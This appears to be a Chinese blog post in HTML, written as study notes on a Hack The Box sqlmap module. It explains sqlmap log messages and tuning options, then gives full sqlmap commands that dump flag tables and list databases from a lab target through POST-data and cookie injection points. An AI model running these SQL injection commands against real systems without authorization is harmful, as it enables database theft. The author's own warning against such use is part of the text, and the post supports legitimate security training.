@@ -1,0 +1,242 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>sqlmap-htb | ziddzide的个人博客</title><meta name="author" content="ziddzide"><meta name="copyright" content="ziddzide"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQlmap日志描述URL content is stable1这意味着，在连续发送相同请求的情况下，响应之间不会出现重大变化。从自动化角度来看，这一点至关重要，因为在响应稳定的情况下，更容易发现由潜在的 SQL 注入攻击引起的差异。虽然稳定性很重要，但 SQLMap 拥有先进的机制，可以自动消除可能来自不稳定目标的“噪声”。  Parameter appears to be dynamic1被测">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap-htb">
+<meta property="og:url" content="https://ziddzide.github.io/2026/06/17/sqlmap-htb/index.html">
+<meta property="og:site_name" content="ziddzide的个人博客">
+<meta property="og:description" content="SQlmap日志描述URL content is stable1这意味着，在连续发送相同请求的情况下，响应之间不会出现重大变化。从自动化角度来看，这一点至关重要，因为在响应稳定的情况下，更容易发现由潜在的 SQL 注入攻击引起的差异。虽然稳定性很重要，但 SQLMap 拥有先进的机制，可以自动消除可能来自不稳定目标的“噪声”。  Parameter appears to be dynamic1被测">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover3.png">
+<meta property="article:published_time" content="2026-06-17T15:50:54.000Z">
+<meta property="article:modified_time" content="2026-06-17T17:17:00.296Z">
+<meta property="article:author" content="ziddzide">
+<meta property="article:tag" content="Web,Security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover3.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "sqlmap-htb",
+  "url": "https://ziddzide.github.io/2026/06/17/sqlmap-htb/",
+  "image": "https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover3.png",
+  "datePublished": "2026-06-17T15:50:54.000Z",
+  "dateModified": "2026-06-17T17:17:00.296Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "ziddzide",
+      "url": "https://ziddzide.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://ziddzide.github.io/2026/06/17/sqlmap-htb/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 18 || hour >= 6
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'sqlmap-htb',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>.recent-posts.masonry .recent-post-item{background:var(--card-bg);border-radius:12px;padding:0;box-shadow:0 1px 8px rgba(0,0,0,.06);transition:all .35s cubic-bezier(.4,0,.2,1);border:1px solid transparent;overflow:hidden;position:relative}.recent-posts.masonry .recent-post-item::before{content:'';position:absolute;left:0;top:0;width:3px;height:0;background:linear-gradient(180deg,#49B1F5,#00c4b6);transition:height .35s ease;border-radius:3px 0 0 3px;z-index:1}.recent-posts.masonry .recent-post-item:hover{transform:translateY(-4px);box-shadow:0 12px 30px rgba(0,0,0,.12);border-color:rgba(73,177,245,.3)}.recent-posts.masonry .recent-post-item:hover::before{height:100%}.recent-posts.masonry .recent-post-info.no-cover{padding:28px 28px 24px}.recent-posts.masonry .article-title{font-size:1.15em!important;font-weight:600;line-height:1.5;transition:color .25s}.recent-posts.masonry .article-title:hover{color:#49B1F5}.recent-posts.masonry .article-meta-wrap{font-size:.82em;margin:10px 0 12px;padding-bottom:12px;border-bottom:1px dashed rgba(128,128,128,.18)}.recent-posts.masonry .article-meta-wrap i{color:#49B1F5}.recent-posts.masonry .content{color:#666;font-size:.92em;line-height:1.7;-webkit-line-clamp:3}</style><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/win.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/user/user.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">62</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover3.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/butterfly-icon.png" alt="Logo"><span class="site-name">ziddzide的个人博客</span></a><a class="nav-page-title" href="/"><span class="site-name">sqlmap-htb</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">sqlmap-htb</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-17T15:50:54.000Z" title="发表于 2026-06-17 23:50:54">2026-06-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-17T17:17:00.296Z" title="更新于 2026-06-18 01:17:00">2026-06-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SQlmap日志描述"><a href="#SQlmap日志描述" class="headerlink" title="SQlmap日志描述"></a>SQlmap日志描述</h1><h3 id="URL-content-is-stable"><a href="#URL-content-is-stable" class="headerlink" title="URL content is stable"></a>URL content is stable</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这意味着，在连续发送相同请求的情况下，响应之间不会出现重大变化。从自动化角度来看，这一点至关重要，因为在响应稳定的情况下，更容易发现由潜在的 SQL 注入攻击引起的差异。虽然稳定性很重要，但 SQLMap 拥有先进的机制，可以自动消除可能来自不稳定目标的“噪声”。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Parameter-appears-to-be-dynamic"><a href="#Parameter-appears-to-be-dynamic" class="headerlink" title="Parameter appears to be dynamic"></a>Parameter appears to be dynamic</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">被测参数最好是“动态的”，这意味着对其值的任何更改都会导致响应的变化；因此，该参数可以与数据库关联。如果输出是“静态的”且保持不变，则可能表明目标系统（至少在当前上下文中）未处理被测参数的值。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Parameter-might-be-injectable"><a href="#Parameter-might-be-injectable" class="headerlink" title="Parameter might be injectable\"></a>Parameter might be injectable\</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据库管理系统 (DBMS) 错误是潜在 SQL 注入的良好指标。在本例中，当 SQLMap 发送一个故意无效的值（例如 `false` ?id=1&quot;,)..).))&#x27;）时，MySQL 出现错误，这表明被测参数可能存在 SQL 注入漏洞，且目标数据库可能是 MySQL。需要注意的是，这并非 SQL 注入的证明，而仅仅表明需要在后续运行中验证检测机制。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Parameter-might-be-vulnerable-to-XSS-attacks"><a href="#Parameter-might-be-vulnerable-to-XSS-attacks" class="headerlink" title="Parameter might be vulnerable to XSS attacks"></a>Parameter might be vulnerable to XSS attacks</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">虽然这不是 SQLMap 的主要用途，但它也会对是否存在 XSS 漏洞进行快速启发式测试。在大规模测试中，SQLMap 需要测试大量参数，因此这种快速启发式检查非常有用，尤其是在没有发现 SQL 注入漏洞的情况下。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Back-end-DBMS-is-‘…’"><a href="#Back-end-DBMS-is-‘…’" class="headerlink" title="Back-end DBMS is ‘…’"></a>Back-end DBMS is ‘…’</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通常情况下，SQLMap 会测试所有受支持的数据库管理系统 (DBMS)。如果明确表明目标正在使用特定的 DBMS，我们可以将有效载荷的范围缩小到仅针对该 DBMS。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Level-risk-values"><a href="#Level-risk-values" class="headerlink" title="Level&#x2F;risk values"></a>Level&#x2F;risk values</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果明确表明目标系统使用了特定的数据库管理系统（DBMS），则可以针对该DBMS扩展测试范围，超出常规测试。</span><br><span class="line">这意味着要运行所有针对该DBMS的SQL注入攻击载荷；而如果没有检测到DBMS，则只会测试最常用的攻击载荷。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Reflective-values-found"><a href="#Reflective-values-found" class="headerlink" title="Reflective values found"></a>Reflective values found</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请注意，响应中包含部分已使用的有效负载。这可能会导致自动化工具出现问题，因为它代表了无用信息。不过，SQLMap 具有过滤机制，可以在比较原始页面内容之前移除这些无用信息。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Parameter-appears-to-be-injectable"><a href="#Parameter-appears-to-be-injectable" class="headerlink" title="Parameter appears to be injectable"></a>Parameter appears to be injectable</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此消息表明该参数似乎可被注入，但仍有可能为误报。对于基于布尔值的盲注和类似的 SQL 注入类型（例如，基于时间的盲注），由于误报率较高，SQLMap 会在运行结束时执行广泛的测试，包括简单的逻辑检查，以排除误报。</span><br><span class="line"></span><br><span class="line">此外，with --string=&quot;luther&quot;SQLMap 还识别并利用响应中出现的常量字符串值luther来区分不同TRUE的响应FALSE。这是一个重要的发现，因为在这种情况下，无需使用诸如动态性/反射消除或响应模糊比较等高级内部机制，这些机制不会造成误报。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Time-based-comparison-statistical-model"><a href="#Time-based-comparison-statistical-model" class="headerlink" title="Time-based comparison statistical model"></a>Time-based comparison statistical model</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQLMap 使用统计模型来识别正常响应和（故意）延迟的目标响应。为了使该模型正常工作，需要收集足够数量的正常响应时间数据。这样，即使在高延迟网络环境中，SQLMap 也能通过统计方法区分故意延迟。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Extending-UNION-query-injection-technique-tests"><a href="#Extending-UNION-query-injection-technique-tests" class="headerlink" title="Extending UNION query injection technique tests"></a>Extending UNION query injection technique tests</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">与其它类型的 SQLi 相比，UNION 查询 SQLi 检查需要更多的请求才能成功识别可用的有效载荷。为了降低每个参数的测试时间，尤其是在目标看似无法注入的情况下，此类检查的请求次数被限制为一个固定值（例如 10）。但是，如果目标存在漏洞的可能性较大，尤其是在发现另一种（潜在的）SQLi 技术的情况下，SQLMap 会增加 UNION 查询 SQLi 检查的默认请求次数，因为成功率更高。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Technique-appears-to-be-usable"><a href="#Technique-appears-to-be-usable" class="headerlink" title="Technique appears to be usable"></a>Technique appears to be usable</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为了对 UNION 查询 SQL 注入类型进行启发式检查，在实际UNION发送有效载荷之前，ORDER BY会检查一种称为 SQLMap 的技术是否可用。如果可用，SQLMap 可以UNION通过执行二分查找方法快速识别所需列的正确数量。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Parameter-is-vulnerable"><a href="#Parameter-is-vulnerable" class="headerlink" title="Parameter is vulnerable"></a>Parameter is vulnerable</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是 SQLMap 最重要的消息之一，因为它表明该参数存在 SQL 注入漏洞。通常情况下，用户可能只想找到至少一个可用于攻击目标的注入点（即参数）。但是，如果我们对 Web 应用程序进行全面测试，并希望报告所有潜在漏洞，则可以继续搜索所有易受攻击的参数。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Sqlmap-identified-injection-points"><a href="#Sqlmap-identified-injection-points" class="headerlink" title="Sqlmap identified injection points"></a>Sqlmap identified injection points</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">接下来列出了所有注入点的类型、标题和有效载荷，这最终证明了已成功检测和利用 SQL 注入漏洞。需要注意的是，SQLMap 仅列出那些经证实可利用（即可用）的漏洞。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Data-logged-to-text-files"><a href="#Data-logged-to-text-files" class="headerlink" title="Data logged to text files"></a>Data logged to text files</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这指示用于存储特定目标（在本例中为 `&lt;target_name&gt;`）所有日志、会话和输出数据的本地文件系统位置www.example.com。在首次运行（成功检测到注入点）之后，后续运行的所有详细信息都将存储在同一目录的会话文件中。这意味着 SQLMap 会根据会话文件的数据，尽可能减少所需的目标请求次数。</span><br></pre></td></tr></table></figure>
+
+<h1 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h1><h3 id="前-后缀调整"><a href="#前-后缀调整" class="headerlink" title="前&#x2F;后缀调整"></a>前&#x2F;后缀调整</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在极少数情况下，需要使用特殊的前缀和后缀值，而常规的 SQLMap 运行无法涵盖这些情况。</span><br><span class="line">对于此类运行，--prefix可以--suffix使用如下选项：</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;www.example.com/?q=test&quot; --prefix=&quot;%&#x27;))&quot; --suffix=&quot;-- -&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="risk-level"><a href="#risk-level" class="headerlink" title="risk&#x2F;level"></a>risk&#x2F;level</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">默认情况下，SQLMap 结合了一组预定义的最常用边界（即前缀/后缀对）以及在目标存在漏洞时成功率较高的向量。此外，用户还可以使用 SQLMap 中已集成的更大规模的边界和向量集。</span><br><span class="line"></span><br><span class="line">针对此类需求，应采用--level以下选项：--risk</span><br><span class="line"></span><br><span class="line">该选项--level（1-5，默认值1）会根据其成功预期（即预期越低，级别越高）扩展所使用的向量和边界。</span><br><span class="line">该选项--risk（1-3，默认值1）根据向量集在目标端造成问题的风险（即数据库条目丢失或拒绝服务的风险）来扩展所使用的向量集。</span><br><span class="line">检查不同 ` --leveland`值下使用的边界和有效负载之间差异的最佳方法--risk是使用-v`--verbosity` 选项设置详细级别。在详细级别 3 或更高（例如 `--verbosity 3` -v 3）下</span><br></pre></td></tr></table></figure>
+
+<h3 id="高级调校"><a href="#高级调校" class="headerlink" title="高级调校"></a>高级调校</h3><p>为了进一步微调检测机制，SQLMap 提供了一系列丰富的开关和选项。通常情况下，SQLMap 不需要使用这些开关和选项。但是，我们仍然需要熟悉它们，以便在需要时能够使用。</p>
+<h5 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h5><p>例如，当处理包含大量动态内容的大型目标响应时，可以利用响应之间的细微差别TRUE进行FALSE检测。如果响应之间的差异TRUE可以FALSE从 HTTP 代码中看出（例如，<code> 200GET</code> 响应对应 <code> GET</code> 代码，<code>GET</code> 响应对应 <code> TRUEGET</code>500代码FALSE），则可以使用该选项–code将响应检测限定TRUE为特定的 HTTP 代码（例如，<code>GET</code> –code&#x3D;200）。</p>
+<h5 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h5><p>如果可以通过检查 HTTP 页面标题来发现响应之间的差异，–titles则可以使用该开关来指示检测机制根据 HTML 标签的内容进行比较<title>。</p>
+<h5 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h5><p>如果TRUE响应中出现特定的字符串值（例如success），而FALSE响应中不存在该字符串值，则可以使用该选项–string仅根据该单个值的出现来固定检测（例如–string&#x3D;success）。</p>
+<h5 id="纯文本"><a href="#纯文本" class="headerlink" title="纯文本"></a>纯文本</h5><p>当处理大量隐藏内容时，例如某些 HTML 页面行为标签（例如<script><code><p> <style></code>、<meta><code><p></code>、<code><p></code> 等），我们可以使用–text-only开关，该开关会删除所有 HTML 标签，并且仅基于文本（即可见）内容进行比较。</p>
+<h5 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h5><p>在某些特殊情况下，我们需要将使用的有效载荷类型限定为特定类型。例如，如果基于时间的盲注有效载荷导致响应超时等问题，或者我们希望强制使用特定的 SQL 注入有效载荷类型，则–technique可以使用该选项指定要使用的 SQL 注入技术。</p>
+<p>例如，如果我们想跳过基于时间的盲注和堆叠式 SQLi 有效负载，而只测试基于布尔值的盲注、基于错误的和 UNION 查询有效负载，我们可以使用以下方式指定这些技术–technique&#x3D;BEU。</p>
+<h5 id="UNION-SQLi-调优"><a href="#UNION-SQLi-调优" class="headerlink" title="UNION SQLi 调优"></a>UNION SQLi 调优</h5><p>在某些情况下，UNIONSQL注入攻击需要用户提供额外信息才能生效。如果我们能够手动找到存在漏洞的SQL查询的确切列数，就可以使用选项将此数字提供给SQLMap –union-cols（例如–union-cols&#x3D;17）。如果SQLMap使用的默认“虚拟”填充值（NULL随机整数）与存在漏洞的SQL查询结果中的值不兼容，我们可以指定一个替代值（例如–union-char&#x3D;’a’）。</p>
+<p>此外，如果需要在查询末尾使用附录（UNION例如FROM <table>，在 Oracle 中），我们可以使用选项进行设置–union-from（例如–union-from&#x3D;users）。<br>未能FROM自动使用正确的附录可能是由于在使用数据库管理系统 (DBMS) 之前无法检测到其名称。</p>
+<h1 id="表-flag2-的内容是什么？"><a href="#表-flag2-的内容是什么？" class="headerlink" title="表 flag2 的内容是什么？"></a>表 flag2 的内容是什么？</h1><p>在浏览器里复制为curl，将curl改为sqlmap即可，或者也可以将部分修改为id&#x3D;*,请注意，我在靶场环境中实验只需要攻破即可，切勿在现实真实环境中使用<code>--dump</code>参数，拖库(盗窃数据)3-7年，如有不对请及时查看网络安全法,还有一件事就是batch参数会帮你做出选择，但是我没有关注过是否会提升risk和level，因为手动爆库和表居多，没怎么用过，需要注意考察下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sqlmap &#x27;http://154.57.164.70:31117/case2.php&#x27; \</span><br><span class="line">  --compressed \</span><br><span class="line">  -X POST \</span><br><span class="line">  -H &#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0&#x27; \</span><br><span class="line">  -H &#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27; \</span><br><span class="line">  -H &#x27;Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&#x27; \</span><br><span class="line">  -H &#x27;Accept-Encoding: gzip, deflate&#x27; \</span><br><span class="line">  -H &#x27;Referer: http://154.57.164.70:31117/case2.php&#x27; \</span><br><span class="line">  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \</span><br><span class="line">  -H &#x27;Origin: http://154.57.164.70:31117&#x27; \</span><br><span class="line">  -H &#x27;Connection: keep-alive&#x27; \</span><br><span class="line">  -H &#x27;Upgrade-Insecure-Requests: 1&#x27; \</span><br><span class="line">  -H &#x27;Priority: u=0, i&#x27; \</span><br><span class="line">  --data-raw &#x27;id=1&#x27; \</span><br><span class="line">  --dump \</span><br><span class="line">  --batch</span><br></pre></td></tr></table></figure>
+<h1 id="flag3-表的内容是什么？"><a href="#flag3-表的内容是什么？" class="headerlink" title="flag3 表的内容是什么？"></a>flag3 表的内容是什么？</h1><p>这里我们可以看到响应里有一个set-cookie分配cookie：id&#x3D;1，所以我们需要手动添加cookie头，可以使用*提示sqlmap注入点在这里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://154.57.164.70:31117/case3.php&#x27; \</span><br><span class="line">  --compressed \</span><br><span class="line">  -H &#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0&#x27; \</span><br><span class="line">  -H &#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27; \</span><br><span class="line">  -H &#x27;Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&#x27; \</span><br><span class="line">  -H &#x27;Accept-Encoding: gzip, deflate&#x27; \</span><br><span class="line">  -H &#x27;Connection: keep-alive&#x27; \</span><br><span class="line">  -H &#x27;Referer: http://154.57.164.70:31117/&#x27; \</span><br><span class="line">  -H &#x27;Upgrade-Insecure-Requests: 1&#x27; \</span><br><span class="line">  -H &#x27;Priority: u=0, i&#x27; \</span><br><span class="line">  -H &#x27;cookie: id=*&#x27; \</span><br><span class="line">  --dump \</span><br><span class="line">  --batch</span><br></pre></td></tr></table></figure>
+
+<p>我使用了上述命令后没有爆出flag3，只有user表，所以需要</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap &#x27;http://154.57.164.70:31117/case3.php&#x27;   --compressed   -H &#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0&#x27;   -H &#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;   -H &#x27;Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5&#x27;   -H &#x27;Accept-Encoding: gzip, deflate&#x27;   -H &#x27;Connection: keep-alive&#x27;   -H &#x27;Referer: http://154.57.164.70:31117/&#x27;   -H &#x27;Upgrade-Insecure-Requests: 1&#x27;   -H &#x27;Priority: u=0, i&#x27; -H &#x27;cookie: id=*&#x27; --dbs</span><br></pre></td></tr></table></figure>
+
+<p>爆库名</p>
